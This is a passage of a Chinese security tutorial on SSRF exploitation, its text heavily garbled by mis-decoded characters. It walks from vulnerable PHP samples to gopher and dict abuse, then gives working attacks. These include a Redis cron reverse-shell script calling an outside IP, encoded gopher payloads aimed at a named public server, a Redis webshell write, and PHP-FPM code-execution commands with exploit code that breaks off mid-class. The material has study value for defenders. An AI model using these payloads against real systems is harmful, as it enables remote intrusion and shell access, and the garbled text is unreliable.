ä¸ªä¸»è¦äº§ç”Ÿssrfæ¼æ´çš„å‡½æ•°ã€‚ file_get_contents() file_get_contentsæ˜¯æŠŠæ–‡ä»¶å†™å…¥å­—ç¬¦ä¸²ï¼Œå½“æŠŠurlæ˜¯å†…ç½‘æ–‡ä»¶çš„æ—¶å€™ï¼Œä»–ä¼šå…ˆå»æŠŠè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹è¯»å‡ºæ¥å†å†™å…¥ï¼Œå¯¼è‡´äº†æ–‡ä»¶è¯»å–ã€‚ 123456789101112&lt;?phpif(isset($_POST[&#x27;url&#x27;]))&#123; $content=file_get_contents($_POST[&#x27;url&#x27;]); $filename=&#x27;./images/&#x27;.rand().&#x27;.img&#x27;;\\ file_put_contents($filename,$content); echo $_POST[&#x27;url&#x27;]; $img=&quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125;echo $img;?&gt; fsockopen() fsockopen()å‡½æ•°æœ¬èº«å°±æ˜¯æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…Unixå¥—æ¥å­—è¿æ¥ã€‚ 12345678910111213141516&lt;?php$host=$_GET[&#x27;url&#x27;];$fp = fsockopen(&quot;$host&quot;, 80, $errno, $errstr, 30);if (!$fp) &#123; echo &quot;$errstr ($errno)&lt;br /&gt;\\n&quot;;&#125; else &#123; $out = &quot;GET / HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; fwrite($fp, $out); while (!feof($fp)) &#123; echo fgets($fp, 128); &#125; fclose($fp);&#125;?&gt; curl() è¿™åº”è¯¥æ˜¯å¤§å®¶æœ€ç†Ÿæ‚‰çš„ä¸€ä¸ªå‡½æ•°äº†ï¼Œå› ä¸ºåˆ©ç”¨æ–¹å¼å¾ˆå¤šæœ€å¸¸è§çš„æ˜¯é€šè¿‡fileã€dictã€gopherè¿™ä¸‰ä¸ªåè®®æ¥è¿›è¡Œæ¸—é€ï¼Œæ¥ä¸‹æ¥ä¹Ÿä¸»è¦æ˜¯é›†ä¸­è®²å¯¹äºcurl()å‡½æ•°çš„åˆ©ç”¨æ–¹å¼ã€‚ è¿™é‡Œä¸€å®šè¦å®‰è£…PHPçš„curlæ‰©å±•ï¼ï¼ï¼Windowsç¯å¢ƒä¸‹php-studyç”¨å¤šäº†ï¼Œåˆ°äº†Linuxç¯å¢ƒéƒ½ä¸çŸ¥é“æ€ä¹ˆæ­ç¯å¢ƒäº†ã€‚ï¼ˆæŠ˜è…¾äº†ä¸€ä¸‹åˆå‘ç°æ²¡æœ‰å®‰è£…php-curlâ€¦==ï¼‰https://segmentfault.com/a/1190000009068818 12345678910function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET[&#x27;url&#x27;];curl($url); ä¸‹é¢å°±è¯¦ç»†è®²ä¸€ä¸‹curlå‡½æ•°åœ¨ssrfä¸­çš„å…·ä½“åˆ©ç”¨æ–¹å¼ã€‚ åˆ©ç”¨æ–¹å¼ ä¸€äº›åè®®çš„ç†è§£ åœ¨è®²åˆ©ç”¨æ–¹å¼ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹curlå‘½ä»¤æ”¯æŒå“ªäº›ç½‘ç»œåè®®ï¼š 12345root@ca01h:/var/www/html/ssrf# curl -Vurl 7.66.0 (x86_64-pc-linux-gnu) libcurl/7.66.0 OpenSSL/1.1.1d zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.39.2 librtmp/2.3Release-Date: 2019-09-11Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp Features: AsynchDNS brotli GSS-API HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets å¯ä»¥çœ‹åˆ°è¯¥ç‰ˆæœ¬çš„curlæ”¯æŒå¾ˆå¤šåè®®ï¼Œå…¶ä¸­gopheråè®®ã€dictåè®®ã€fileåè®®ã€http/såè®®ç”¨çš„æ¯”è¾ƒå¤šã€‚ gopher Gopher wiki äº’è”ç½‘ä¸Šä½¿ç”¨çš„åˆ†å¸ƒå‹çš„æ–‡ä»¶æœé›†è·å–ç½‘ç»œåè®®ï¼Œå‡ºç°åœ¨httpåè®®ä¹‹å‰ã€‚ï¼ˆå¯ä»¥æ¨¡æ‹ŸGET/POSTè¯·æ±‚ï¼Œæ¢è¡Œä½¿ç”¨%0d%0aï¼Œç©ºç™½è¡Œ%0aï¼‰ã€‚ gopheråè®®çš„æ ¼å¼ï¼š 1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ gopheråè®®åœ¨curlå‘½ä»¤ä¸­çš„ä½¿ç”¨æ–¹å¼ï¼š 1curl gopher://localhost:2222/hello%0agopher é€šè¿‡ncå›æ˜¾å¯ä»¥å‘ç°ï¼Œæ•°æ®æ¢è¡Œäº†ï¼Œ ç„¶è€Œ hello åªå›æ˜¾äº† ello ï¼Œä¹Ÿå°±æ˜¯è¯´ h â€œè¢«åƒäº†â€, å› æ­¤è¦åœ¨ä¼ è¾“çš„æ•°æ®å‰åŠ ä¸€ä¸ªæ— ç”¨å­—ç¬¦ï¼š 1curl gopher://localhost:2222/_hello%0agopher å¦‚æœæ˜¯åœ¨åœ°å€æ åˆ©ç”¨payloadæ—¶ï¼Œéœ€è¦è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼š 1http:&#x2F;&#x2F;192.168.91.130&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;localhost:2222&#x2F;_hello%250agopher å†åˆ©ç”¨ssrf.phpï¼š 1234567891011121314151617[root@ca01h ~]# nc -l -vv 2333Ncat: Version 6.40 ( http://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333Ncat: Connection from 127.0.0.1.Ncat: Connection from 127.0.0.1:47726 [root@ca01h html]# curl -v &#x27;http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test&#x27; [root@ca01h ~]# nc -l -vv 2333Ncat: Version 6.40 ( http://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333Ncat: Connection from 127.0.0.1.Ncat: Connection from 127.0.0.1:47726.test dict å­—å…¸æœåŠ¡å™¨åè®®ã€‚dictæ˜¯åŸºäºæŸ¥è¯¢ç›¸åº”çš„TCPåè®®ã€‚æœåŠ¡å™¨ç›‘å¬ç«¯å£2628ã€‚æ¼æ´ä»£ç æ²¡æœ‰å±è”½å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨dictåè®®è·å–sshç­‰æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯ã€‚ å› ä¸ºssrf.phpçš„æ¼æ´ä»£ç æœ‰å›æ˜¾ï¼Œæ‰€ä»¥curlå‘½ä»¤ç›´æ¥è®¿é—® 12curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info å³å¯çœ‹åˆ°redisçš„ç›¸å…³é…ç½®ã€‚ 12curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:22/info å³å¯çœ‹åˆ°sshçš„bannerä¿¡æ¯ã€‚ å¦‚æœssrf.phpä¸­åŠ ä¸Šä¸€è¡Œå±è”½å›æ˜¾çš„ä»£ç curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);ï¼Œé‚£ä¹ˆè¿™ç§æ–¹å¼å°±å¤±æ•ˆäº†ï¼Œå’Œgopherä¸€æ ·ï¼Œåªèƒ½åˆ©ç”¨ncç›‘å¬ç«¯å£ï¼Œåå¼¹ä¼ è¾“æ•°æ®äº†ã€‚ file æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®ï¼Œä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ã€‚ å› ä¸ºssrf.phpçš„æ¼æ´ä»£ç æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æµè§ˆå™¨ç›´æ¥è®¿é—®ï¼š http/s ä¸»è¦ç”¨æ¥æ¢æµ‹å†…ç½‘æœåŠ¡ã€‚æ ¹æ®å“åº”çš„çŠ¶æ€åˆ¤æ–­å†…ç½‘ç«¯å£åŠæœåŠ¡ï¼Œå¯ä»¥ç»“åˆjavaç³»åˆ—0dayå’Œå…¶ä»–å„ç§0dayä½¿ç”¨ã€‚ æ”»å‡»Redis ç›®æ ‡ï¼šé˜¿é‡Œäº‘æœåŠ¡å™¨ Centos7 IPï¼š47.97.199.89 æ”»å‡»ï¼šåä¸ºäº‘æœåŠ¡å™¨ Centos7 IPï¼š121.36.45.17 å…·ä½“ç¯å¢ƒæ­å»ºè¯·è½¬åˆ°æ–‡ç« æœ«å°¾çš„Appendix Bã€‚ Redisåå¼¹Shellï¼ˆrootæƒé™ï¼‰ ä»€ä¹ˆæ˜¯åå¼¹Shellï¼šhttps://xz.aliyun.com/t/2549 å…ˆå†™ä¸€ä¸ªredisåå¼¹shellçš„bashè„šæœ¬å¦‚ä¸‹ï¼š 1234567#shell.shecho -e &quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\\n\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit åœ¨redisçš„ç¬¬0ä¸ªæ•°æ®åº“ä¸­æ·»åŠ keyä¸º1ï¼Œvalueä¸º\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\\n\\n\\n\\nçš„å­—æ®µã€‚æœ€åä¼šå¤šå‡ºä¸€ä¸ªnæ˜¯å› ä¸ºechoé‡å®šå‘æœ€åä¼šè‡ªå¸¦ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚CONFIG SET å‘½ä»¤åŠ¨æ€åœ°è°ƒæ•´ Redis æœåŠ¡å™¨çš„é…ç½®ï¼Œæ¯ä¸ªç”¨æˆ·ç”Ÿæˆçš„crontabæ–‡ä»¶ï¼Œéƒ½ä¼šæ”¾åœ¨ /var/spool/cron/ ç›®å½•ä¸‹é¢ï¼Œsetç›´æ¥å¾€å½“å‰ç”¨æˆ·çš„crontabé‡Œå†™å…¥åå¼¹shellã€‚ æƒ³è·å–Redisæ”»å‡»çš„TCPæ•°æ®åŒ…ï¼Œå¯ä»¥ä½¿ç”¨socatè¿›è¡Œç«¯å£è½¬å‘ã€‚ 123socat -v tcp-listen:4444,fork tcp-connect:localhost:6379bash shell.sh 127.0.0.1 4444 æ„æ€æ˜¯å°†æœ¬æœºçš„4444ç«¯å£è½¬å‘åˆ°æœ¬æœºçš„6379ç«¯å£ã€‚è®¿é—®è¯¥æœåŠ¡å™¨çš„4444ç«¯å£ï¼Œè®¿é—®çš„å…¶å®æ˜¯è¯¥æœåŠ¡å™¨çš„6379ç«¯å£ã€‚æ•è·åˆ°æ•°æ®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&gt; 2019&#x2F;12&#x2F;16 13:50:01.167534 length&#x3D;89 from&#x3D;0 to&#x3D;88*3\\r$3\\rset\\r$1\\r1\\r$62\\r*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.167814 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.171555 length&#x3D;57 from&#x3D;0 to&#x3D;56*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$16\\r&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.171779 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.175397 length&#x3D;52 from&#x3D;0 to&#x3D;51*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$4\\rroot\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.175619 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.179000 length&#x3D;14 from&#x3D;0 to&#x3D;13*1\\r$4\\rsave\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.185711 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.189649 length&#x3D;14 from&#x3D;0 to&#x3D;13*1\\r$4\\rquit\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.189817 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r è½¬æ¢è§„åˆ™å¦‚ä¸‹ï¼š å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯&gt;æˆ–è€…&lt; é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚ å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯+OK é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚ å°†\\rå­—ç¬¦ä¸²æ›¿æ¢æˆ%0d%0a ç©ºç™½è¡Œæ›¿æ¢ä¸º%0a è½¬æ¢è„šæœ¬ï¼štran2gopher.py 1234567891011121314151617181920212223242526272829303132333435python tran2gopher.py socat.log#coding: utf-8#author: JoyChouimport sysexp = &#x27;&#x27;with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in &#x27;&gt;&lt;+&#x27;: if line[1] in &#x27;?&#x27;: exp = exp + line else: continue # åˆ¤æ–­å€’æ•°ç¬¬2ã€3å­—ç¬¦ä¸²æ˜¯å¦ä¸º\\r elif line[-3:-1] == r&#x27;\\r&#x27;: # å¦‚æœè¯¥è¡Œåªæœ‰\\rï¼Œå°†\\ræ›¿æ¢æˆ%0a%0d%0a if len(line) == 3: exp = exp + &#x27;%0a%0d%0a&#x27; else: line = line.replace(r&#x27;\\r&#x27;, &#x27;%0d%0a&#x27;) # å»æ‰æœ€åçš„æ¢è¡Œç¬¦ line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) exp = exp + line # åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º%0a elif line == &#x27;\\x0a&#x27;: exp = exp + &#x27;%0a&#x27; else: line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) exp = exp + lineexp.replace(&quot;$&quot;, &quot;%24&quot;)exp.replace(&quot;&lt;&quot;, &quot;%3C&quot;)exp.replace(&quot;&gt;&quot;, &quot;%3E&quot;)exp.replace(&quot;?&quot;, &quot;%3F&quot;)print exp ç»“æœä¸ºï¼š 12*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a åœ¨æ”»å‡»æ–¹æ‰§è¡Œå‘½ä»¤ï¼š 123curl -v &#x27;gopher://47.97.199.89:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.179/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#x27; å‡ºç°5ä¸ªokï¼Œåˆ™æˆåŠŸäº†å†™å…¥ï¼š 12345678910Trying 47.97.199.89:6379...* TCP_NODELAY set* Connected to 47.97.199.89 (47.97.199.89) port 6379 (#0)+OK+OK+OK+OK+OK* Closing connection 0 é‚£å†æ£€æµ‹ä»¥ä¸‹Rediså†™å…¥çš„å­—æ®µå’Œcrontabçš„å†…å®¹ã€‚ æ£€æµ‹Redisæ•°æ®åº“çš„å­—æ®µä¸º&quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\\n\\n\\n\\n&quot; æ£€æµ‹crontabçš„å†…å®¹ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚ æœ€ååœ¨ç›®æ ‡æœºä¸Šç›‘å¬ç«¯å£2333ï¼š 12nc -lvvp 2333 ç¨ç­‰ä¸€ä¸‹ï¼Œå°±å¯ä»¥æˆåŠŸåå¼¹shellã€‚ è·å– web æœåŠ¡çš„ webshell å½“ redis æƒé™ä¸é«˜æ—¶ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¼€ç€ web æœåŠ¡ï¼Œåœ¨ redis æœ‰ web ç›®å½•å†™æƒé™æ—¶ï¼Œå¯ä»¥å°è¯•å¾€ web è·¯å¾„å†™ webshellã€‚ æ¨¡ä»¿ä¸Šé¢çš„shellè„šæœ¬æ¥å†™ï¼š 12345678# shell2.phpredis-cli -h $1 -p $2 flushallredis-cli -h $1 -p $2 config set dir /var/www/redis-cli -h $1 -p $2 config set dbfilename shell.phpredis-cli -h $1 -p $2 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;redis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit æ³¨æ„ï¼šä¸€å®šè¦åœ¨$POSTå‰é¢åŠ ä¸Šè½¬ä¹‰ç¬¦\\ï¼Œä¸ç„¶åœ¨æœ€åçš„æ–‡ä»¶é‡Œé¢$_POSTä¼šè¢«åæ‰ï¼ï¼ï¼ï¼ˆå› ä¸º$ç¬¦å·æ˜¯redisçš„ä¸€ç§è¯­æ³•ï¼‰ æ‰§è¡Œshell2.phpï¼ŒåŒæ ·ä½¿ç”¨socatåœ¨4444ç«¯å£è½¬å‘ã€‚ æ•è·åˆ°çš„æ•°æ®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435*1\\r$8\\rflushall\\r*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$8\\r&#x2F;var&#x2F;www\\r*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$9\\rshell.php\\r*3\\r$3\\rset\\r$3\\rweb\\r$18\\r%3C%3Fphp%20phpinfo()%3B%3F%3E\\r*1\\r$4\\rsave\\r*1\\r$4\\rquit\\r å‚è€ƒjoychouå†™cronçš„è„šæœ¬è½¬æ¢ï¼Œpythonè½¬æ¢è„šæœ¬å¦‚ä¸‹: 12345678f &#x3D; open(&#39;payload.txt&#39;, &#39;r&#39;)s &#x3D; &#39;&#39;for line in f.readlines(): line &#x3D; line.replace(r&quot;\\r&quot;, &quot;%0d%0a&quot;) line &#x3D; line.replace(&quot;\\n&quot;, &#39;&#39;) s &#x3D; s + lineprint s.replace(&quot;$&quot;, &quot;%24&quot;) å¦‚ä¸Šçš„å†™shellæ•°æ®æµç»è¿‡ç¼–ç å¦‚ä¸‹(æ³¨æ„phpä¸€å¥è¯ï¼Œç»è¿‡ä¸Šé¢è½¬æ¢è¿˜æ˜¯å°–æ‹¬å·ï¼Œä½†æ˜¯ä½¿ç”¨curlå‘é€çš„æ—¶å€™è¦æŠŠä¸€å¥è¯çš„ä¸¤ä¸ªå°–æ‹¬å·å’Œ;å’Œ?urlç¼–ç ï¼Œç„¶åä½¿ç”¨curlç›´æ¥å‘é€å¦‚ä¸‹ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥$è¿˜è¦ç¼–ç ï¼ŒçŸ¥é“çš„åŒå­¦è¯·å‘ŠçŸ¥ï¼Œè°¢è°¢ï¼‰: 123[root@ca0y1h-centos ~]# python tran2gopher.py socat2.logcurl -v &quot;gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a/var/www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0aquit%0d%0a&quot; ç„¶åä¸Šé¢çš„payloadåœ¨å­˜åœ¨ssrfçš„æ—¶å€™ï¼Œä½¿ç”¨å‘é€ä¹‹å‰è¦å†urlç¼–ç ä¸€æ¬¡ï¼Œå‘é€å³å¯å¾—åˆ°shellã€‚ æ”»å‡»fastcgiï¼ˆTCPæ¨¡å¼ï¼‰ ç¯å¢ƒæ­å»ºè¯·è½¬åˆ°æ–‡ç« è«é—®çš„Appendix Bã€‚ ä»€ä¹ˆæ˜¯fastcgi è¯·è½¬åˆ°æ–‡ç« æœ«å°¾çš„Appendix Aã€‚ fastcgié»˜è®¤ç›‘å¬ç«¯å£ä¸ºæœ¬æœºçš„9000ç«¯å£ï¼Œå¦‚æœå¯¹å¤–å¼€æ”¾çš„è¯å°±æœ‰å¯èƒ½é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼ˆå…·ä½“çœ‹pç‰›æ–‡ç« ä»‹ç»ï¼Œè®²çš„éå¸¸è¯¦ç»†äº†ï¼‰ã€‚ä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸ä¼šå¯¹å¤–å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦é…åˆgopher+ssrfåŠ ä»¥åˆ©ç”¨ã€‚ 123456æ¡ä»¶: libcurlç‰ˆæœ¬&gt;&#x3D;7.45.0 (expä¸­å­˜åœ¨%00ï¼Œcurlç‰ˆæœ¬å°äº7.45.0ï¼Œgopherçš„%00ä¼šè¢«æˆªæ–­) PHP-FPMç›‘å¬ç«¯å£ PHP-FPMç‰ˆæœ¬ &gt;&#x3D; 5.3.3 çŸ¥é“æœåŠ¡å™¨ä¸Šä»»æ„ä¸€ä¸ªphpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ è¿œç¨‹æ”»å‡»php-fpm è¿™ä¸ªåœºæ™¯æ˜¯æœ‰äº›ç®¡ç†å‘˜ä¸ºäº†æ–¹ä¾¿å§,æŠŠfastcgiç›‘å¬ç«¯å£è®¾ç½®ä¸º: listen = 0.0.0.0:9000è€Œä¸æ˜¯listen = 127.0.0.1:9000 è¿™æ ·å­å¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ è¿™é‡Œåˆ©ç”¨pç‰›çš„exploitè„šæœ¬: fpm.py pythonå‘½ä»¤ï¼š 12python fpm.py -c &#x27;&lt;?php echo `id`;exit;?&gt;&#x27; 192.168.188.130 /var/www/html/index.php SSRFæ”»å‡»æœ¬åœ°çš„php-fpm åŸºæœ¬åŸç† PHP-FPMå¼€æ”¾åœ¨å…¬ç½‘ä¸Šçš„æƒ…å†µæ˜¯å¾ˆå°‘çš„ï¼Œå¤§éƒ¨åˆ†æ—¶å€™éƒ½æ˜¯å¯åŠ¨åœ¨æœ¬åœ°å³ç›‘å¬127.0.0.1:9000åœ°å€çš„ã€‚ è™½ç„¶æˆ‘ä»¬æ²¡æœ‰åŠæ³•ç›´æ¥å¯¹PHP-FPMå‘èµ·æ”»å‡»ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»“åˆå…¶ä»–æ¼æ´æ¥é—´æ¥åˆ©ç”¨ã€‚å¦‚æœç›®æ ‡ç«™ç‚¹å­˜åœ¨SSRFæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©SSRFæ¥æ”»å‡»æœ¬åœ°PHP-FPMæœåŠ¡ï¼Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœã€‚ åˆ©ç”¨æ–¹å¼ ä¹‹å‰å·²ç»æåˆ°Gopheråè®®åœ¨SSRFåˆ©ç”¨ä¸­è¢«å¹¿æ³›è¿ç”¨ï¼Œå…¶URLæ ¼å¼å¦‚ä¸‹ï¼š 12gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡Gopheråè®®ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å‘é€TCPåè®®æµï¼Œå†è¿›è¡Œurlencodeç¼–ç æ¥æ„é€ SSRFæ”»å‡»ä»£ç ï¼Œå…¶ä¸­æ”»å‡»ä»£ç å°±æ˜¯æ¶æ„FastCGIåè®®æŠ¥æ–‡ã€‚ è¿™é‡Œæœ‰ä¸‰ç§æ–¹å¼æ¥ç”Ÿæˆæ¶æ„FastCGIåè®®æŠ¥æ–‡ï¼š ä¸€ç§æ˜¯ä¸ç”¨ä¿®æ”¹Pç‰›çš„è„šæœ¬ï¼Œåœ¨æœ¬å³ä¸Šç›´æ¥å°†æµé‡æ‰“åˆ°æŸä¸€ä¸ªç«¯å£ï¼ˆæ¯”å¦‚9999ï¼‰ï¼ŒåŒæ—¶ç›‘å¬æ­¤ç«¯å£ï¼Œå†ä¿å­˜åˆ°æœ¬åœ°åè¿›è¡Œurlç¼–ç ï¼ˆæ­¤æ—¶è¦æ±‚æœ¬æœºä¸Šä¹Ÿæœ‰php-fpmæœåŠ¡ï¼‰ã€‚ 123456789# æœ¬æœºç›‘å¬[root@ca01h ~] nc -lvvp 9999 &gt; exp.txtNcat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::9999Ncat: Listening on 0.0.0.0:9999# æœ¬æœºæ‰§è¡Œ[root@ca01h ~] python fpm.py 127.0.0.1 /usr/share/nginx/html/index.php -c &quot;&lt;?php echo `whoami`; exit();?&gt;&quot; -p 9999 è¿™æ ·exp.txtä¸­å°±æˆ‘ä»¬æ‰€éœ€è¦çš„æ¶æ„FastCGIåè®®æŠ¥æ–‡ï¼Œå†ç”¨ä¸‹é¢çš„å°è„šæœ¬å¯¹å…¶urlencodeå¾—åˆ°æœ€ç»ˆçš„Payloadï¼š 12345from urllib import quotewith open(&#x27;exp.txt&#x27;) as f: pld = f.read()print quote(pld) nginxè§£ç ä¸€æ¬¡,php-fpmè§£ç ä¸€æ¬¡ã€‚ ç¬¬äºŒç§æ˜¯ä¿®æ”¹Pç‰›çš„è„šæœ¬ï¼Œè®©å…¶ç›´æ¥è¿”å›è¯·æ±‚çš„æŠ¥æ–‡å¹¶å°†å…¶urlencodeä¸€æ¬¡ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259# -*- coding: utf-8 -*-import socketimport randomimport argparseimport sysfrom six.moves.urllib import parse as urlparsefrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 